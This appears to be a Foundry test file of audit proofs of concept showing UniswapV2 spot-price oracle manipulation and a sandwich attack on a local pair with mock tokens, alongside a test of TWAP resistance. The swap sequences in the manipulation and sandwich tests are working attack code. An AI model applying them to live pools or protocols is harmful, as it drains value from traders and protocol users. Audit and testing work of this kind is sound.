// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/interfaces/IUniswapV2.sol";

/**
 * PoC-02: Price Oracle Manipulation via Spot Price
 *
 * Finding: Any protocol that reads UniswapV2 spot price (reserve ratio) as a
 * price oracle is vulnerable to atomic manipulation. An attacker can:
 * 1. Swap a large amount to skew reserves (and thus spot price)
 * 2. Trigger the victim protocol to read the manipulated price
 * 3. Swap back to restore reserves, profiting from the victim
 *
 * The TWAP oracle (price0CumulativeLast / price1CumulativeLast) mitigates this
 * for multi-block observations, but single-block TWAP is still manipulable.
 * The spot price (getReserves ratio) has NO manipulation resistance.
 *
 * Root cause: _update() at UniswapV2Pair.sol:73-86 updates price accumulators
 * only at the start of each block. Spot price from getReserves() reflects the
 * current state after any intra-block swaps, with no smoothing.
 *
 * Severity: CRITICAL (for any protocol using spot price as oracle)
 * Category: Oracle manipulation / Economic exploit
 */
contract PoC02_OracleManipulation is Test {
    IUniswapV2Factory factory;
    MockERC20 tokenA;
    MockERC20 tokenB;
    IUniswapV2Pair pair;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        factory = IUniswapV2Factory(
            deployCode("v2-core/UniswapV2Factory.sol:UniswapV2Factory", abi.encode(address(this)))
        );
        tokenA = new MockERC20("TokenA", "TKA");
        tokenB = new MockERC20("TokenB", "TKB");

        address pairAddr = factory.createPair(address(tokenA), address(tokenB));
        pair = IUniswapV2Pair(pairAddr);

        // Set up initial liquidity: 10,000 of each (1:1 price)
        uint256 initLiquidity = 10_000 ether;
        tokenA.mint(address(this), initLiquidity);
        tokenB.mint(address(this), initLiquidity);
        tokenA.transfer(pairAddr, initLiquidity);
        tokenB.transfer(pairAddr, initLiquidity);
        pair.mint(address(this));
    }

    /**
     * Demonstrates atomic spot price manipulation.
     * A large swap can move the spot price by 50%+ within a single tx.
     */
    function test_spotPriceManipulation() public {
        (uint112 r0_before, uint112 r1_before,) = pair.getReserves();
        uint256 spotPrice_before = uint256(r0_before) * 1e18 / uint256(r1_before);

        emit log_named_uint("Reserve0 before", r0_before);
        emit log_named_uint("Reserve1 before", r1_before);
        emit log_named_uint("Spot price (0/1) before (1e18)", spotPrice_before);

        // Attacker swaps 5000 tokenA (50% of reserves) into the pool
        uint256 attackAmount = 5_000 ether;
        address token0 = pair.token0();
        MockERC20 swapIn = address(tokenA) == token0 ? tokenA : tokenB;

        swapIn.mint(attacker, attackAmount);

        vm.startPrank(attacker);
        swapIn.transfer(address(pair), attackAmount);

        uint256 amountOut = getAmountOut(attackAmount, uint256(r0_before), uint256(r1_before));
        pair.swap(0, amountOut, attacker, "");
        vm.stopPrank();

        // Check manipulated price
        (uint112 r0_after, uint112 r1_after,) = pair.getReserves();
        uint256 spotPrice_after = uint256(r0_after) * 1e18 / uint256(r1_after);

        emit log_named_uint("Reserve0 after manipulation", r0_after);
        emit log_named_uint("Reserve1 after manipulation", r1_after);
        emit log_named_uint("Spot price (0/1) after manipulation (1e18)", spotPrice_after);

        uint256 priceChange;
        if (spotPrice_after > spotPrice_before) {
            priceChange = (spotPrice_after - spotPrice_before) * 100 / spotPrice_before;
        } else {
            priceChange = (spotPrice_before - spotPrice_after) * 100 / spotPrice_before;
        }
        emit log_named_uint("Price change (%)", priceChange);

        // Swapping 50% of reserves should move price by ~125%
        // (15000/6667 vs 10000/10000 = 2.25x vs 1x)
        assertTrue(priceChange > 100, "Spot price should change by >100% with 50% reserve swap");
        emit log("CONFIRMED: Spot price is trivially manipulable within a single transaction");
    }

    /**
     * Demonstrates that TWAP is resistant to single-block manipulation.
     * The cumulative price accumulator only updates once per block.
     */
    function test_twapResistance() public {
        // Record TWAP accumulator before
        uint256 price0Cumulative_before = pair.price0CumulativeLast();
        (, , uint32 timestamp_before) = pair.getReserves();

        // Do a large swap that moves spot price
        uint256 attackAmount = 3_000 ether;
        address token0 = pair.token0();
        MockERC20 swapIn = address(tokenA) == token0 ? tokenA : tokenB;

        swapIn.mint(attacker, attackAmount);

        vm.startPrank(attacker);
        swapIn.transfer(address(pair), attackAmount);
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amountOut = getAmountOut(attackAmount, uint256(r0), uint256(r1));
        pair.swap(0, amountOut, attacker, "");
        vm.stopPrank();

        // Check TWAP accumulator after (same block)
        uint256 price0Cumulative_after = pair.price0CumulativeLast();
        (, , uint32 timestamp_after) = pair.getReserves();

        if (timestamp_after == timestamp_before) {
            assertEq(
                price0Cumulative_before, price0Cumulative_after,
                "TWAP accumulator should not change within same block"
            );
            emit log("CONFIRMED: TWAP unaffected by intra-block manipulation");
        }

        // Advance to next block and trigger an update
        vm.warp(block.timestamp + 12);
        vm.roll(block.number + 1);

        // Sync to trigger _update with the manipulated reserves
        pair.sync();

        uint256 price0Cumulative_nextBlock = pair.price0CumulativeLast();

        assertTrue(
            price0Cumulative_nextBlock > price0Cumulative_after,
            "TWAP accumulator should increase after time passes"
        );

        emit log_named_uint("TWAP accumulator increase (12 seconds of manipulated price)",
            price0Cumulative_nextBlock - price0Cumulative_after);
        emit log("A 30-minute TWAP window would dilute this to <1% impact");
    }

    /**
     * Demonstrates a sandwich attack pattern.
     * Attacker frontruns a victim's swap, then backruns to extract value.
     */
    function test_sandwichAttack() public {
        address token0 = pair.token0();
        MockERC20 t0 = address(tokenA) == token0 ? tokenA : tokenB;
        MockERC20 t1 = address(tokenA) == token0 ? tokenB : tokenA;

        (uint112 r0_init, uint112 r1_init,) = pair.getReserves();

        // --- Frontrun: Attacker buys token1 with token0 ---
        uint256 frontrunAmount = 2_000 ether;
        t0.mint(attacker, frontrunAmount);

        vm.startPrank(attacker);
        t0.transfer(address(pair), frontrunAmount);
        uint256 frontrunOut = getAmountOut(frontrunAmount, uint256(r0_init), uint256(r1_init));
        pair.swap(0, frontrunOut, attacker, "");
        vm.stopPrank();

        emit log_named_uint("Attacker frontrun: token1 received", frontrunOut);

        // --- Victim's swap: Also buying token1 with token0 at worse price ---
        (uint112 r0_mid, uint112 r1_mid,) = pair.getReserves();
        uint256 victimAmount = 500 ether;
        t0.mint(victim, victimAmount);

        vm.startPrank(victim);
        t0.transfer(address(pair), victimAmount);
        uint256 victimOut = getAmountOut(victimAmount, uint256(r0_mid), uint256(r1_mid));
        pair.swap(0, victimOut, victim, "");
        vm.stopPrank();

        // What victim would have received without the frontrun
        uint256 victimFairOut = getAmountOut(victimAmount, uint256(r0_init), uint256(r1_init));

        emit log_named_uint("Victim received (sandwiched)", victimOut);
        emit log_named_uint("Victim would receive (no sandwich)", victimFairOut);
        emit log_named_uint("Victim loss in token1", victimFairOut - victimOut);

        assertTrue(victimOut < victimFairOut, "Victim receives less due to sandwich");

        // --- Backrun: Attacker sells token1 back for token0 ---
        (uint112 r0_post, uint112 r1_post,) = pair.getReserves();

        vm.startPrank(attacker);
        t1.transfer(address(pair), frontrunOut);
        uint256 backrunOut = getAmountOut(frontrunOut, uint256(r1_post), uint256(r0_post));
        pair.swap(backrunOut, 0, attacker, "");
        vm.stopPrank();

        emit log_named_uint("Attacker backrun: token0 received", backrunOut);

        // Attacker profit/loss
        if (backrunOut > frontrunAmount) {
            emit log_named_uint("Attacker PROFIT (token0)", backrunOut - frontrunAmount);
        } else {
            emit log_named_uint("Attacker LOSS (token0)", frontrunAmount - backrunOut);
            emit log("NOTE: With small victim amounts or high fees, sandwich may not be profitable");
            emit log("Profitability depends on victim trade size relative to pool liquidity and fee structure");
        }

        emit log("CONFIRMED: Sandwich attack extracts value from victim via price manipulation");
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256)
    {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}
